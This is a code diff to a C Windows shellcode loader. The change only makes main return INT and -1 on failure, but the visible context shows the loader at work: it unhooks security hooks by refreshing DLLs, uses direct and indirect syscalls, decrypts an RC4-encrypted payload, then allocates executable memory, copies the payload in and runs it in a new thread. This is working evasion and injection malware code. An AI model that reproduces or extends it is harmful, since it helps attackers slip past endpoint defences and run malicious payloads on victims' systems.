@@ -70,7 +70,7 @@ BOOL InitializeNtSyscalls() {
 	return TRUE;
 }
 
-BOOL main() {
+INT main() {
 
 	NTSTATUS	STATUS = NULL;
 	PVOID		pAddress = NULL;
@@ -85,28 +85,28 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] Failed To Initialize The Unhooking Indirect-Syscalls\n");
 #endif
-		return FALSE;
+		return -1;
 	}
 
 	if (!IniDirectCalls()) {
 #ifdef DEBUG
 		PRINTA("[!] Failed To Initialize The Unhooking Direct-Syscalls\n");
 #endif
-		return FALSE;
+		return -1;
 	}
 
 	if (!InitializeNtSyscalls()) {
 #ifdef DEBUG
 		PRINTA("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
 #endif
-		return FALSE;
+		return -1;
 	}
 
 	if (!RefreshAllDlls()) {
 #ifdef DEBUG
 		PRINTA("[!] RefreshAllDlls Failed\n");
 #endif
-		return FALSE;
+		return -1;
 	}
 
 	Rc4EncryptionViSystemFunc032(ProtectedKey, Payload, KEY_SIZE, sizeof(Payload));
@@ -116,7 +116,7 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
 #endif
-		return FALSE;
+		return -1;
 	}
 
 	_memcpy(pAddress, Payload, sizeof(Payload));
@@ -126,7 +126,7 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
 #endif
-		return FALSE;
+		return -1;
 	}
 
 	SET_SYSCALL(g_Nt.NtCreateThreadEx);
@@ -134,7 +134,7 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
 #endif
-		return FALSE;
+		return -1;
 	}
 
 	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
@@ -142,7 +142,7 @@ BOOL main() {
 #ifdef DEBUG
 		PRINTA("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
 #endif
-		return FALSE;
+		return -1;
 	}
 
 	return 0;
